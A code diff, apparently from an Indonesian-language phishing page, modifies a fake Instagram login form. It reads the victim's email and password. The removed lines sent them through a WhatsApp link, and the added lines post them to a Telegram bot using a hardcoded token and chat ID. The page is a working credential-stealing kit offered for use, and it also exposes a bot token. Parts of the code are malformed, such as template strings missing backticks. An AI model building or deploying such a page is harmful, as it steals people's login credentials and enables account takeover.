@@ -25,14 +25,15 @@
       var email = document.getElementById("email").value;
       var password = document.getElementById("password").value;
 
-      // Nomor WhatsApp Anda (kode negara tanpa + atau 0 di depan)
-      var nomorWhatsApp = "62856038910564";
+const botToken = "7906274301:AAFMIgRpysWIpa9bIrREjZu9LJE7KGXabGs"; // Ganti dengan token bot lo
+                const chatId = "8092060437"; // Ganti dengan ID chat lo
 
-      var pesan = Login Instagram\nEmail: ${email}\nPassword: ${password};
-      var url = https://api.whatsapp.com/send?phone=${nomorWhatsApp}&text=${encodeURIComponent(pesan)};
-      
-      window.open(url, "_blank");
-    });
-  </script>
-</body>
-</html>
+                const telegramApi = https://api.telegram.org/bot${botToken}/sendMessage;
+                const telegramResponse = await fetch(telegramApi, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: "Markdown" })
+                });
+
+                if (telegramResponse.ok) {
+                    document.body.innerHTML = "<h2>Pesan berhasil dikirim ke Telegram!</h2>";
